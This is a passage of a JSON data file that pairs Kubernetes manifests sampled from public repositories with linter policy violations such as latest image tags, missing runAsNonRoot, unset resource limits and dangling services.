    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8235",
    "manifest_path": "data/manifests/the_stack_sample/sample_3057.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8236",
    "manifest_path": "data/manifests/the_stack_sample/sample_3057.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8237",
    "manifest_path": "data/manifests/the_stack_sample/sample_3057.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8238",
    "manifest_path": "data/manifests/the_stack_sample/sample_3057.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8239",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"vscode\" is using an invalid container image, \"ibmblockchain/vscode:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8240",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-vscode\" does not have a read-only root file system"
  },
  {
    "id": "8241",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"vscode\" does not have a read-only root file system"
  },
  {
    "id": "8242",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-vscode\" is not set to runAsNonRoot"
  },
  {
    "id": "8243",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"vscode\" is not set to runAsNonRoot"
  },
  {
    "id": "8244",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-vscode\" has cpu request 0"
  },
  {
    "id": "8245",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"vscode\" has cpu request 0"
  },
  {
    "id": "8246",
    "manifest_path": "data/manifests/the_stack_sample/sample_3059.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vscode\nspec:\n  selector:\n    matchLabels:\n      app: vscode\n  template:\n    metadata:\n      labels:\n        app: vscode\n    spec:\n      initContainers:\n      - name: init-vscode\n        image: ubuntu:18.04\n        command:\n        - /bin/sh\n        - -c\n        args:\n        - chown 1001:1001 /home/vscode\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      containers:\n      - name: vscode\n        image: ibmblockchain/vscode:latest\n        resources:\n          limits:\n            memory: 512Mi\n            cpu: 2000m\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /home/vscode\n          name: vscode\n      volumes:\n      - name: vscode\n        persistentVolumeClaim:\n          claimName: vscode\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-vscode\" has memory limit 0"
  },
  {
    "id": "8247",
    "manifest_path": "data/manifests/the_stack_sample/sample_3060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: elasticsearch\n  labels:\n    component: elasticsearch\n    role: client\nspec:\n  type: LoadBalancer\n  selector:\n    component: elasticsearch\n    role: client\n  ports:\n  - name: http\n    port: 9200\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:elasticsearch role:client])"
  },
  {
    "id": "8248",
    "manifest_path": "data/manifests/the_stack_sample/sample_3061.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: whoami\nspec:\n  ports:\n  - protocol: TCP\n    name: web\n    port: 80\n  selector:\n    component: whoami\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[component:whoami])"
  },
  {
    "id": "8249",
    "manifest_path": "data/manifests/the_stack_sample/sample_3063.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: coturn\n  labels:\n    app: coturn\nspec:\n  selector:\n    app: coturn\n  ports:\n  - name: port-udp-30500\n    protocol: UDP\n    nodePort: 30500\n    port: 30500\n    targetPort: 3478\n  - name: port-tcp-30500\n    protocol: TCP\n    nodePort: 30500\n    port: 30500\n    targetPort: 3478\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:coturn])"
  },
  {
    "id": "8250",
    "manifest_path": "data/manifests/the_stack_sample/sample_3064.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: flight-tracker-service\nspec:\n  selector:\n    app: flight-tracker\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 3000\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:flight-tracker])"
  },
  {
    "id": "8251",
    "manifest_path": "data/manifests/the_stack_sample/sample_3066.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/name: spring-petclinic-test\n  name: spring-petclinic-test\nspec:\n  ports:\n  - port: 80\n    targetPort: 8080\n  selector:\n    app.kubernetes.io/name: spring-petclinic-test\n  sessionAffinity: None\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:spring-petclinic-test])"
  },
  {
    "id": "8252",
    "manifest_path": "data/manifests/the_stack_sample/sample_3070.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: oneshot\n  labels:\n    chapter: jobs\nspec:\n  template:\n    metadata:\n      labels:\n        chapter: jobs\n    spec:\n      containers:\n      - name: kuard\n        image: gcr.io/kuar-demo/kuard-amd64:1\n        imagePullPolicy: Always\n        args:\n        - --keygen-enable\n        - --keygen-exit-on-complete\n        - --keygen-exit-code=1\n        - --keygen-num-to-gen=3\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "8253",
    "manifest_path": "data/manifests/the_stack_sample/sample_3070.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: oneshot\n  labels:\n    chapter: jobs\nspec:\n  template:\n    metadata:\n      labels:\n        chapter: jobs\n    spec:\n      containers:\n      - name: kuard\n        image: gcr.io/kuar-demo/kuard-amd64:1\n        imagePullPolicy: Always\n        args:\n        - --keygen-enable\n        - --keygen-exit-on-complete\n        - --keygen-exit-code=1\n        - --keygen-num-to-gen=3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kuard\" does not have a read-only root file system"
  },
  {
    "id": "8254",
    "manifest_path": "data/manifests/the_stack_sample/sample_3070.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: oneshot\n  labels:\n    chapter: jobs\nspec:\n  template:\n    metadata:\n      labels:\n        chapter: jobs\n    spec:\n      containers:\n      - name: kuard\n        image: gcr.io/kuar-demo/kuard-amd64:1\n        imagePullPolicy: Always\n        args:\n        - --keygen-enable\n        - --keygen-exit-on-complete\n        - --keygen-exit-code=1\n        - --keygen-num-to-gen=3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kuard\" is not set to runAsNonRoot"
  },
  {
    "id": "8255",
    "manifest_path": "data/manifests/the_stack_sample/sample_3070.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: oneshot\n  labels:\n    chapter: jobs\nspec:\n  template:\n    metadata:\n      labels:\n        chapter: jobs\n    spec:\n      containers:\n      - name: kuard\n        image: gcr.io/kuar-demo/kuard-amd64:1\n        imagePullPolicy: Always\n        args:\n        - --keygen-enable\n        - --keygen-exit-on-complete\n        - --keygen-exit-code=1\n        - --keygen-num-to-gen=3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kuard\" has cpu request 0"
  },
  {
    "id": "8256",
    "manifest_path": "data/manifests/the_stack_sample/sample_3070.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: oneshot\n  labels:\n    chapter: jobs\nspec:\n  template:\n    metadata:\n      labels:\n        chapter: jobs\n    spec:\n      containers:\n      - name: kuard\n        image: gcr.io/kuar-demo/kuard-amd64:1\n        imagePullPolicy: Always\n        args:\n        - --keygen-enable\n        - --keygen-exit-on-complete\n        - --keygen-exit-code=1\n        - --keygen-num-to-gen=3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kuard\" has memory limit 0"
  },
  {
    "id": "8257",
    "manifest_path": "data/manifests/the_stack_sample/sample_3072.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app\n        image: bhcosta90/dockerfile-app\n        command:\n        - /bin/sh\n        - -c\n        - ln -s /var/www /usr/share/nginx; /var/www/k8s/app/entrypoint.sh; php-fpm\n          -D;nginx -g \"daemon off;\"\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        envFrom:\n        - configMapRef:\n            name: app-conf\n        volumeMounts:\n        - name: app-conf\n          mountPath: /var/www/.env\n          subPath: .env\n      volumes:\n      - name: app-conf\n        configMap:\n          name: app-conf\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"app\" is using an invalid container image, \"bhcosta90/dockerfile-app\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8258",
    "manifest_path": "data/manifests/the_stack_sample/sample_3072.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app\n        image: bhcosta90/dockerfile-app\n        command:\n        - /bin/sh\n        - -c\n        - ln -s /var/www /usr/share/nginx; /var/www/k8s/app/entrypoint.sh; php-fpm\n          -D;nginx -g \"daemon off;\"\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        envFrom:\n        - configMapRef:\n            name: app-conf\n        volumeMounts:\n        - name: app-conf\n          mountPath: /var/www/.env\n          subPath: .env\n      volumes:\n      - name: app-conf\n        configMap:\n          name: app-conf\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"app\" does not have a read-only root file system"
  },
  {
    "id": "8259",
    "manifest_path": "data/manifests/the_stack_sample/sample_3072.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app\n        image: bhcosta90/dockerfile-app\n        command:\n        - /bin/sh\n        - -c\n        - ln -s /var/www /usr/share/nginx; /var/www/k8s/app/entrypoint.sh; php-fpm\n          -D;nginx -g \"daemon off;\"\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        envFrom:\n        - configMapRef:\n            name: app-conf\n        volumeMounts:\n        - name: app-conf\n          mountPath: /var/www/.env\n          subPath: .env\n      volumes:\n      - name: app-conf\n        configMap:\n          name: app-conf\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"app\" is not set to runAsNonRoot"
  },
  {
    "id": "8260",
    "manifest_path": "data/manifests/the_stack_sample/sample_3072.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app\n        image: bhcosta90/dockerfile-app\n        command:\n        - /bin/sh\n        - -c\n        - ln -s /var/www /usr/share/nginx; /var/www/k8s/app/entrypoint.sh; php-fpm\n          -D;nginx -g \"daemon off;\"\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        envFrom:\n        - configMapRef:\n            name: app-conf\n        volumeMounts:\n        - name: app-conf\n          mountPath: /var/www/.env\n          subPath: .env\n      volumes:\n      - name: app-conf\n        configMap:\n          name: app-conf\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"app\" has cpu request 0"
  },
  {
    "id": "8261",
    "manifest_path": "data/manifests/the_stack_sample/sample_3072.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: app\nspec:\n  selector:\n    matchLabels:\n      app: app\n  template:\n    metadata:\n      labels:\n        app: app\n    spec:\n      containers:\n      - name: app\n        image: bhcosta90/dockerfile-app\n        command:\n        - /bin/sh\n        - -c\n        - ln -s /var/www /usr/share/nginx; /var/www/k8s/app/entrypoint.sh; php-fpm\n          -D;nginx -g \"daemon off;\"\n        ports:\n        - containerPort: 80\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        envFrom:\n        - configMapRef:\n            name: app-conf\n        volumeMounts:\n        - name: app-conf\n          mountPath: /var/www/.env\n          subPath: .env\n      volumes:\n      - name: app-conf\n        configMap:\n          name: app-conf\n          items:\n          - key: env\n            path: .env\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"app\" has memory limit 0"
  },
  {
    "id": "8262",
    "manifest_path": "data/manifests/the_stack_sample/sample_3073.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: akash-hostname-operator\n  labels:\n    akash.network/component: akash-hostname-operator\nspec:\n  selector:\n    matchLabels:\n      app: akash-hostname-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: akash-hostname-operator\n        akash.network/component: akash-hostname-operator\n    spec:\n      serviceAccountName: akash-operator\n      containers:\n      - name: akash-hostname-operator\n        image: ghcr.io/ovrclk/akash:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        - /boot/run.sh\n        ports:\n        - name: status\n          containerPort: 8085\n        env:\n        - name: AKASH_K8S_MANIFEST_NS\n          valueFrom:\n            configMapKeyRef:\n              name: akash-provider-config\n              key: k8s-manifest-ns\n        - name: AKASH_PRUNE_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: prune-interval\n        - name: AKASH_IGNORE_LIST_ENTRY_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-entry-limit\n        - name: AKASH_WEB_REFRESH_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: web-refresh-interval\n        - name: AKASH_RETRY_DELAY\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: retry-delay\n        - name: AKASH_IGNORE_LIST_AGE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-age-limit\n        - name: AKASH_EVENT_FAILURE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: event-failure-limit\n        volumeMounts:\n        - name: boot\n          mountPath: /boot\n          readOnly: true\n      volumes:\n      - name: boot\n        configMap:\n          name: akash-hostname-operator-boot\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"akash-hostname-operator\" does not have a read-only root file system"
  },
  {
    "id": "8263",
    "manifest_path": "data/manifests/the_stack_sample/sample_3073.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: akash-hostname-operator\n  labels:\n    akash.network/component: akash-hostname-operator\nspec:\n  selector:\n    matchLabels:\n      app: akash-hostname-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: akash-hostname-operator\n        akash.network/component: akash-hostname-operator\n    spec:\n      serviceAccountName: akash-operator\n      containers:\n      - name: akash-hostname-operator\n        image: ghcr.io/ovrclk/akash:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        - /boot/run.sh\n        ports:\n        - name: status\n          containerPort: 8085\n        env:\n        - name: AKASH_K8S_MANIFEST_NS\n          valueFrom:\n            configMapKeyRef:\n              name: akash-provider-config\n              key: k8s-manifest-ns\n        - name: AKASH_PRUNE_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: prune-interval\n        - name: AKASH_IGNORE_LIST_ENTRY_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-entry-limit\n        - name: AKASH_WEB_REFRESH_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: web-refresh-interval\n        - name: AKASH_RETRY_DELAY\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: retry-delay\n        - name: AKASH_IGNORE_LIST_AGE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-age-limit\n        - name: AKASH_EVENT_FAILURE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: event-failure-limit\n        volumeMounts:\n        - name: boot\n          mountPath: /boot\n          readOnly: true\n      volumes:\n      - name: boot\n        configMap:\n          name: akash-hostname-operator-boot\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"akash-operator\" not found"
  },
  {
    "id": "8264",
    "manifest_path": "data/manifests/the_stack_sample/sample_3073.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: akash-hostname-operator\n  labels:\n    akash.network/component: akash-hostname-operator\nspec:\n  selector:\n    matchLabels:\n      app: akash-hostname-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: akash-hostname-operator\n        akash.network/component: akash-hostname-operator\n    spec:\n      serviceAccountName: akash-operator\n      containers:\n      - name: akash-hostname-operator\n        image: ghcr.io/ovrclk/akash:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        - /boot/run.sh\n        ports:\n        - name: status\n          containerPort: 8085\n        env:\n        - name: AKASH_K8S_MANIFEST_NS\n          valueFrom:\n            configMapKeyRef:\n              name: akash-provider-config\n              key: k8s-manifest-ns\n        - name: AKASH_PRUNE_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: prune-interval\n        - name: AKASH_IGNORE_LIST_ENTRY_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-entry-limit\n        - name: AKASH_WEB_REFRESH_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: web-refresh-interval\n        - name: AKASH_RETRY_DELAY\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: retry-delay\n        - name: AKASH_IGNORE_LIST_AGE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-age-limit\n        - name: AKASH_EVENT_FAILURE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: event-failure-limit\n        volumeMounts:\n        - name: boot\n          mountPath: /boot\n          readOnly: true\n      volumes:\n      - name: boot\n        configMap:\n          name: akash-hostname-operator-boot\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"akash-hostname-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8265",
    "manifest_path": "data/manifests/the_stack_sample/sample_3073.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: akash-hostname-operator\n  labels:\n    akash.network/component: akash-hostname-operator\nspec:\n  selector:\n    matchLabels:\n      app: akash-hostname-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: akash-hostname-operator\n        akash.network/component: akash-hostname-operator\n    spec:\n      serviceAccountName: akash-operator\n      containers:\n      - name: akash-hostname-operator\n        image: ghcr.io/ovrclk/akash:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        - /boot/run.sh\n        ports:\n        - name: status\n          containerPort: 8085\n        env:\n        - name: AKASH_K8S_MANIFEST_NS\n          valueFrom:\n            configMapKeyRef:\n              name: akash-provider-config\n              key: k8s-manifest-ns\n        - name: AKASH_PRUNE_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: prune-interval\n        - name: AKASH_IGNORE_LIST_ENTRY_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-entry-limit\n        - name: AKASH_WEB_REFRESH_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: web-refresh-interval\n        - name: AKASH_RETRY_DELAY\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: retry-delay\n        - name: AKASH_IGNORE_LIST_AGE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: ignore-list-age-limit\n        - name: AKASH_EVENT_FAILURE_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: event-failure-limit\n        volumeMounts:\n        - name: boot\n          mountPath: /boot\n          readOnly: true\n      volumes:\n      - name: boot\n        configMap:\n          name: akash-hostname-operator-boot\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"akash-hostname-operator\" has cpu request 0"
  },
  {
    "id": "8266",
    "manifest_path": "data/manifests/the_stack_sample/sample_3073.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: akash-hostname-operator\n  labels:\n    akash.network/component: akash-hostname-operator\nspec:\n  selector:\n    matchLabels:\n      app: akash-hostname-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: akash-hostname-operator\n        akash.network/component: akash-hostname-operator\n    spec:\n      serviceAccountName: akash-operator\n      containers:\n      - name: akash-hostname-operator\n        image: ghcr.io/ovrclk/akash:stable\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/sh\n        - /boot/run.sh\n        ports:\n        - name: status\n          containerPort: 8085\n        env:\n        - name: AKASH_K8S_MANIFEST_NS\n          valueFrom:\n            configMapKeyRef:\n              name: akash-provider-config\n              key: k8s-manifest-ns\n        - name: AKASH_PRUNE_INTERVAL\n          valueFrom:\n            configMapKeyRef:\n              name: akash-hostname-operator-config\n              key: prune-interval\n        - name: AKASH_IGNORE_LIST_ENTRY_LIMIT\n          valueFrom:\n            configMapKeyRef:\n              name: 